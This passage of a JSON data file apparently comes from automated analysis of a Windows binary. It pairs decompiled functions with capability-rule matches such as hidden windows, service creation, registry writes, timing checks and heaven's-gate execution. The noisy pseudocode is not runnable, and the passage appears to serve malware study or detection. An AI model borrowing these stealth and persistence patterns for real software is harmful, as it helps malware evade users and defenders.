(*_sym.imp.MSVCRT.dll_rand)(uVar3);\n                            iVar4 = iVar4 % 0x1a;\n                        }\n                        return;\n                    }\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n            }\n            else {\n                unaff_EBX = unaff_EBX + 1;\n                if (!bVar7 && unaff_EBX != 0) {\n                    in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                    piVar1 = (arg_14h & 0xffff0000 | CONCAT11((arg_14h >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f)\n                             + 0x2a;\n                    *piVar1 = *piVar1 - unaff_EBX;\n                    uVar6 = uVar6 + 1;\n                    goto code_r0x00403586;\n                }\n                LOCK();\n            }\n            *(uVar6 + arg_10h) = uVar2 ^ in_ECX;\n            uVar6 = uVar6 + 1;\n            bVar7 = uVar6 < arg_14h;\n            bVar8 = uVar6 == arg_14h;\n        } while (uVar6 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 811
    },
    "004045a0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404651) overlaps instruction at (ram,0x0040464e)\n// \n// WARNING: Removing unreachable block (ram,0x0040467f)\n// WARNING: Removing unreachable block (ram,0x00404724)\n// WARNING: Removing unreachable block (ram,0x00404694)\n\nulong __cdecl fcn.004045a0(char *arg_8h, uint arg_ch, uint noname_2, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    char **ppcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t uVar9;\n    uint32_t in_EAX;\n    char *pcVar7;\n    uint32_t uVar8;\n    char *in_ECX;\n    uint32_t uVar10;\n    char cVar11;\n    uint32_t in_EDX;\n    uint8_t uVar13;\n    uint32_t *unaff_EBX;\n    uint32_t *puVar12;\n    uint32_t unaff_EBP;\n    char *pcVar14;\n    int32_t iVar15;\n    char *pcVar16;\n    uint32_t unaff_EDI;\n    uint32_t uVar17;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool in_CF;\n    uchar in_PF;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar18;\n    bool bVar19;\n    float10 in_ST0;\n    uchar in_XMM0 [16];\n    uint32_t unaff_retaddr;\n    uint32_t uVar20;\n    double in_stack_46c692c5;\n    uint32_t *in_stack_ffffffe8;\n    uint32_t uStack20;\n    \n    uStack20 = in_EAX;\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_CF = false;\n        uStack20 = in_EAX & 0xe2f4cc58;\n        in_PF = (POPCOUNT(in_EAX & 0x58) & 1U) == 0;\n    }\n    *arg_8h = -0x36;\n    if ((!in_PF) && (in_PF)) {\n        ppcVar3 = segment(in_SS, *0x10 + -0x10);\n        pcVar7 = *ppcVar3;\n        in_EDX = 0xb7bc9ea5;\n        puVar12 = unaff_EBX;\n        if (in_CF) goto code_r0x004045ff;\n        if (in_PF) {\n            do {\n                if (*pcVar7 == *0xb7bc9ea5) {\n                    bVar18 = true;\n                    pcVar16 = 0xb7bc9ea6;\n                    pcVar14 = pcVar7;\n                    do {\n                        pcVar14 = pcVar14 + 1;\n                        unaff_EDI = unaff_EDI - 1;\n                        if (unaff_EDI == 0) break;\n                        bVar18 = *pcVar14 == *pcVar16;\n                        pcVar16 = pcVar16 + 1;\n                    } while (bVar18);\n                    in_ECX = arg_8h;\n                    unaff_EDI = arg_14h;\n                    if (bVar18) goto code_r0x0040459a;\n                }\n                pcVar7 = pcVar7 + 1;\n            } while (pcVar7 <= in_ECX);\n            pcVar7 = NULL;\ncode_r0x0040459a:\n            return CONCAT44(0xb7bc9ea5, pcVar7);\n        }\n        uStack20 = pcVar7;\n    }\n    arg_8h[1] = -0x31;\n    arg_8h[2] = -0xe;\n    puVar12 = (unaff_EBX >> 8 ^ 0x16 | uStack20 >> 8) << 8;\n    in_stack_ffffffe8 = unaff_EBX;\ncode_r0x004045ff:\n    bVar18 = puVar12 >> 8 == in_EDX >> 8;\n    arg_8h[3] = -0x60;\n    pcVar7 = arg_8h;\n    if ((!bVar18) && (bVar18)) {\n        uStack20 = uStack20 & 0xffffff00 | *0x4bb148d3;\n        pcVar7 = arg_8h + 1;\n        out(*arg_8h, in_EDX);\n    }\n    pcVar7[4] = 'B';\n    pcVar14 = pcVar7;\n    if ((!bVar18) && (bVar18)) {\n        uStack20 = uStack20 & 0xffffff00 | *0x4bb148d3;\n        pcVar14 = pcVar7 + 1;\n        out(*pcVar7, in_EDX);\n    }\n    pcVar14[5] = -0x73;\n    uVar17 = uStack20;\n    uStack20 = in_EDX;\n    while( true ) {\n        uVar8 = uVar17;\n        pcVar14[6] = -0x78;\n        pcVar14[7] = -0x50;\n        pcVar14[8] = -0x25;\n        uVar9 = uVar8 >> 8;\n        uVar13 = in_stack_ffffffe8 >> 8 ^ 0x16 | uVar9;\n        cVar11 = uStack20 >> 8;\n        bVar19 = SBORROW1(uVar13, cVar11);\n        bVar18 = uVar13 - cVar11 < '\\0';\n        pcVar14[9] = -0x5b;\n        uVar6 = uVar8;\n        if ((uVar13 <= cVar11) || (cVar11 < uVar13)) break;\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        uVar17 = uVar8 & 0xffff0000 | CONCAT11(uVar9 + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f;\n        uStack20 = uVar8;\n        if (in_ECX != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    pcVar14[10] = -0x26;\n    if ((cVar11 < uVar13) && (uVar13 <= cVar11)) {\n        in_ST0 = in_ST0 - in_stack_46c692c5;\n        bVar19 = false;\n        pcVar14 = pcVar14 | *in_stack_ffffffe8;\n        bVar18 = pcVar14 < 0;\n    }\n    else {\n        pcVar14[0xb] = '3';\n    }\n    uVar17 = unaff_EDI;\n    if ((bVar19 == bVar18) && (bVar19 != bVar18)) {\n        in_SS = unaff_EDI;\n        uVar17 = unaff_EDI & 0xffff0000 | in_ES;\n        pcVar14 = pcVar14 + -1;\n        *(unaff_EDI | &stack0xfffffffc) = uVar6;\n    }\n    pcVar14[0xc] = ',';\n    arg_ch._0_2_ = arg_8h;\n    iVar15 = *(uVar8 + 8);\n    *(iVar15 + 0xd) = 0x60;\n    *(iVar15 + 0xe) = 0xda;\n    uVar10 = unaff_retaddr;\n    do {\n        uVar20 = unaff_EBP;\n        bVar19 = false;\n        bVar18 = (uVar10 - 5U & 0x44) == 0;\n        uVar4 = arg_ch;\n        *(iVar15 + 0xf) = 0xde;\n        if (bVar18) {\ncode_r0x00404768:\n            *(iVar15 + 0x10) = 0x67;\n            break;\n        }\n        uVar10 = (unaff_retaddr >> 8 & 0xffff00) << 8 | unaff_retaddr & 0xffff;\n        if (!bVar18) goto code_r0x00404768;\n        iVar5 = CONCAT22(unaff_retaddr, in_SS);\n        arg_ch._0_2_ = 0;\n        puVar1 = iVar5 + 0x78;\n        uVar6 = *puVar1;\n        uVar9 = uVar4 >> 8;\n        *puVar1 = *puVar1 + uVar9;\n        bVar19 = *puVar1 < '\\0';\n        uVar17 = movmskps(iVar5, in_XMM0);\n        unaff_EBP = uVar10;\n    } while (CARRY1(uVar6, uVar9) || *puVar1 == 0);\n    if (bVar19) {\n        *(uVar17 + 0x1c) = in_ST0;\n        iVar15 = iVar15 + 5;\n    }\n    *(iVar15 + 0x11) = 0x3c;\n    puVar2 = *(uVar8 + 0xc);\n    *puVar2 = 0x12;\n    return CONCAT44(uVar20, puVar2);\n}\n",
        "token_count": 2068
    },
    "00401000": {
        "rules": [
            "hide graphical window",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 16384 named .text\n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x406010, 0x41e524, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 155
    },
    "00401070": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00401070(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (&stack0xfffffff8 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        (*_sym.imp.USER32.dll_ShowWindow)();\n        return 1;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 236
    },
    "00402450": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024a9) overlaps instruction at (ram,0x004024a5)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00402450(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uchar *puVar5;\n    uint *unaff_EDI;\n    \n    puVar2 = (*_sym.imp.MSVCRT.dll_fopen)(filename);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, puVar2);\n    *unaff_EDI = *puVar2;\n    pcVar1 = _sym.imp.MSVCRT.dll_fflush;\n    puVar5 = iVar3 + -4;\n    *(iVar3 + -4) = 0x4024b0;\n    uVar4 = (*pcVar1)();\n    *(puVar5 + 0x10) = uVar4;\n    *(puVar5 + 0xc) = extraout_ECX;\n    *(puVar5 + 0x10) = puVar2 + 1;\n    pcVar1 = _sym.imp.MSVCRT.dll_fclose;\n    *(puVar5 + 0xc) = 0x4024d4;\n    (*pcVar1)();\n    return 1;\n}\n",
        "token_count": 344
    },
    "004027d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402822) overlaps instruction at (ram,0x00402820)\n// \n\nuint fcn.004027d0(int32_t param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    unkbyte3 Var3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar7;\n    uint *puVar6;\n    int32_t extraout_ECX;\n    uint *puVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    ulong uVar12;\n    \n    puVar9 = param_2;\n    iVar4 = param_1;\n    uVar12 = fcn.00402680(param_1, param_2, &param_1);\n    puVar8 = uVar12 >> 0x20;\n    puVar6 = uVar12;\n    bVar11 = puVar6 == NULL;\n    bVar10 = (POPCOUNT(puVar6 & 0xff) & 1U) != 0;\n    if (bVar11) {\n        return 0;\n    }\n    if (bVar10) {\n        if (!bVar10) {\n            out(*puVar9, uVar12 >> 0x20);\n            do {\n                cVar7 = puVar6 >> 8;\n                in_AF = 9 < (puVar6 & 0xf) | in_AF;\n                Var3 = CONCAT21(puVar6 >> 0x10, cVar7 - in_AF);\n                uVar5 = -in_AF;\n                puVar6 = CONCAT31(Var3, uVar5);\n            } while (in_AF || cVar7 == *puVar8);\n            piVar2 = iVar4 + puVar8 * 2;\n            *piVar2 = (*piVar2 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x75) = puVar6;\n            puVar6 = CONCAT31(Var3, uVar5) | 0x89;\n            bVar11 = (uVar5 | 0x89) == 0;\n            puVar9 = puVar9 + 1;\n            goto code_r0x00402812;\n        }\n    }\n    puVar6[0x16] = param_2;\n    puVar8 = param_2;\ncode_r0x00402812:\n    if ((bVar11) || (!bVar11)) {\n        puVar6 = &param_2;\n    }\n    *(iVar4 + -0x73) = *(iVar4 + -0x73) - &stack0xfffffff4;\n    puVar1 = (puVar6 | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | puVar8;\n    fcn.00402680(iVar4, puVar9);\n    return 1;\n}\n",
        "token_count": 662
    },
    "00404500": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nchar * __cdecl fcn.00404500(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    bVar5 = arg_14h == 0;\n    if (bVar5) {\n        return arg_8h;\n    }\n    if ((!bVar5) && (bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (arg_8h <= pcVar1) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 360
    },
    "00404a30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a54) overlaps instruction at (ram,0x00404a53)\n// \n\nuint * fcn.00404a30(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    char *pcVar4;\n    bool in_CF;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((in_CF) || (!in_CF)) {\n        fcn.00404ae0(&var_4h);\n    }\n    puVar2 = func_0x1018a9c6();\n    *puVar2 = *puVar2;\n    pcVar4 = unaff_EBX + -0x3f7afb3c;\n    *pcVar4 = *pcVar4 + puVar2;\n    if (*pcVar4 == '\\0') {\n        return puVar2;\n    }\n    if (var_4h == NULL) {\n        return NULL;\n    }\n    iVar3 = -1;\n    pcVar4 = var_4h;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    return iVar3 == 0;\n}\n",
        "token_count": 327
    },
    "00401160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004011b5) overlaps instruction at (ram,0x004011b3)\n// \n// WARNING: Removing unreachable block (ram,0x00401192)\n\nbool __cdecl fcn.00401160(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    char cVar5;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004028f0();\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004024e0();\n        arg_ch_01 = fcn.004024e0();\n        arg_ch_02 = fcn.004024e0();\n        fcn.00403510(arg_10h, arg_ch_00);\n        fcn.00403510(arg_8h, arg_ch_01);\n        fcn.00403510(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41001c, &lpBuffer, arg_10h);\n        iVar2 = fcn.004035e0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x410028, &lpBuffer, arg_8h);\n            iVar2 = fcn.004035e0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x410028, &lpBuffer, arg_ch);\n                iVar2 = fcn.004035e0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403510(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 739
    },
    "00401500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401555) overlaps instruction at (ram,0x00401550)\n// \n// WARNING: Removing unreachable block (ram,0x0040152e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401500(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    uchar *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar4 = &uStack107;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    bVar5 = true;\n    uVar1 = fcn.004012c0(&uStack108, &uStack8);\n    arg_ch = uStack8;\n    puVar3 = &stack0xfffffffc;\n    if ((!bVar5) && (puVar3 = &stack0xfffffffc,  bVar5)) {\n        arg_ch = uVar1;\n        puVar3 = *0x8b17b43a;\n    }\n    fcn.004029e0(puVar3 + -0x68, arg_ch, 0x406024, 0x9fe0);\n    puVar4 = *(puVar3 + 0xc);\n    **(puVar3 + 8) = 0x406024;\n    *puVar4 = 0x9fe0;\n    return;\n}\n",
        "token_count": 405
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004015a6) overlaps instruction at (ram,0x004015a5)\n// \n\nvoid __cdecl fcn.00401590(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint in_ECX;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX_00;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    bool bVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    if (arg_ch == 1) {\n        uVar3 = CONCAT11(in_ECX >> 8 & unaff_EBX >> 8, in_ECX);\n        iVar6 = unaff_EBX;\n        while( true ) {\n            bVar4 = false;\n            cVar5 = ((uVar3 & 0xff00 | uVar3 | unaff_EBX) & unaff_EDI) == 0;\n            iVar7 = 0x4015b7;\n            fcn.00403860();\n            if ((bVar4) || (!bVar4)) break;\n            uVar3 = extraout_ECX - 1;\n            if (uVar3 == 0 || cVar5 == '\\0') goto code_r0x004015c3;\n            puVar1 = iVar6 + 0x22;\n            *puVar1 = *puVar1 << 0xf | *puVar1 >> 0x11;\n            unaff_EBX = iVar6;\n            iVar6 = iVar7;\n        }\n        fcn.004017d0();\n        uVar3 = extraout_ECX_00;\ncode_r0x004015c3:\n        *unaff_EDI = 5;\n        piVar2 = *0x9750e2b5;\n        arg_ch = -0x174713bc;\n        **0x9750e2b5 = **0x9750e2b5 + *0x9750e2b5;\n        *(uVar3 + 0x41e528) = *(uVar3 + 0x41e528) + (piVar2 >> 8);\n        if (piVar2 == NULL) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403660();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 587
    },
    "004019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.004019a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.004028f0();\n    puStack296 = 0x4019ea;\n    fcn.00403510(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x401a04;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x401a17;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41e524;\n    uStack312 = 0x410360;\n    uStack316 = 0x80000000;\n    uStack320 = 0x401a37;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x410394;\n    uStack328 = 1;\n    uStack332 = 0x41e524;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x4103e0, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x41041c, 1, 0x410424, 0x14);\n    return;\n}\n",
        "token_count": 650
    },
    "00402110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402170) overlaps instruction at (ram,0x0040216d)\n// \n\nuint fcn.00402110(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    char extraout_DL;\n    int32_t unaff_EBP;\n    code *pcVar3;\n    bool bVar4;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4100fc);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        pcVar3 = NULL;\n    }\n    *0x41e52c = (*pcVar3)(iVar1, 0x41010c);\n    bVar4 = false;\n    uVar2 = (*pcVar3)(iVar1, 0x410128);\n    *0x41e530 = uVar2;\n    if ((bVar4) || (!bVar4)) {\n        *0x41e534 = (*pcVar3)(iVar1, 0x410138);\n    }\n    else {\n        *(iVar1 + -1) = *(iVar1 + -1) + extraout_DL;\n        *0x41e534 = uVar2 & 0xffffff00 | *(unaff_EBP + 0x1386876 + (uVar2 & 0xff));\n    }\n    if (((*0x41e52c != 0) && (*0x41e530 != 0)) && (*0x41e534 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 379
    },
    "00402320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004023cf) overlaps instruction at (ram,0x004023cc)\n// \n// WARNING: Removing unreachable block (ram,0x00402391)\n\nbool fcn.00402320(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00403120(0x80000002, 0x410478, 0x4104b8, &var_8h, &var_210h, &var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(&var_210h, 0);\n    bVar4 = iVar2 == -1;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = fcn.004021f0(&var_210h, &var_10ch);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(&var_10ch, 0x4104d0);\n    if (iVar2 != 0) {\n        return true;\n    }\n    iVar2 = (*pcVar1)(&var_10ch, 0x4104d4);\n    return iVar2 != 0;\n}\n",
        "token_count": 514
    },
    "004024e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004024e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00402610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040262e) overlaps instruction at (ram,0x0040262a)\n// \n\nuint __cdecl fcn.00402610(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint hSCManager;\n    uint uVar2;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    \n    if (((!in_CF) && (in_CF)) && (in_ECX = in_ECX + -1,  in_ECX != 0 && in_ZF != '\\0')) {\n        return unaff_EBX;\n    }\n    iVar1 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    *unaff_EDI = *unaff_EDI + in_ECX;\n    *(iVar1 >> 0x1f) = *(iVar1 >> 0x1f) + (in_ECX >> 8);\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar2 = fcn.00401d50(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 303
    },
    "004028f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004028f0(void)\n\n{\n    uint uVar1;\n    bool in_OF;\n    uint *unaff_retaddr;\n    uint in_stack_0000001c;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_retaddr = in_stack_0000001c;\n        return;\n    }\n    if (*0x41e538 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e538 = 1;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00403120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004031af)\n\nbool __cdecl fcn.00403120(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 200
    },
